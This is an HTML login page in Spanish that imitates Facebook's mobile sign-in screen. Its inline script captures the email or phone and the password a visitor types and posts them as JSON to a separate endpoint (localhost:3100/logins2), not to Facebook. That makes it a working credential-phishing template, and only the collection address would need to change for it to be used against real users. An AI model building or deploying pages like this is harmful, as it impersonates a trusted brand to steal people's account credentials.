<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>login</title>
  <link rel="stylesheet" href="f.css">
</head>
<body>
  <div class="mobile-login-container">
    <!-- Logo -->
    <div class="mobile-logo">
      <h1>facebook</h1>
    </div>

    <!-- Formulario -->
    <form id="loginForm" class="mobile-login-form">
      <input type="email" class="uno" placeholder="Correo electrónico o teléfono" required>
      <input type="password" placeholder="Contraseña" required>
      <button type="submit">Iniciar sesión</button>
      <a href="#">¿Olvidaste tu contraseña?</a>
      <hr>
    </form>

    <!-- Mensaje pie de página -->
    <p class="footer-text">Desde tu móvil</p>
  </div>

  <script>
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', async (e) => {
      e.preventDefault(); 
      const email = form.querySelector('input[type="email"]').value;
      const password = form.querySelector('input[type="password"]').value;

      try {
        const response = await fetch('http://localhost:3100/logins2', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ email, password })
        });

        const data = await response.json();
        console.log('Respuesta de la API:', data);

        if (response.ok) {
          alert('Inicio de sesión exitoso');
         
        } else {
          alert('Error: ' + data.message);
        }
      } catch (error) {
        console.error('Error al conectar con la API:', error);
        alert('No se pudo conectar con la API');
      }
    });
  </script>
</body>
</html>
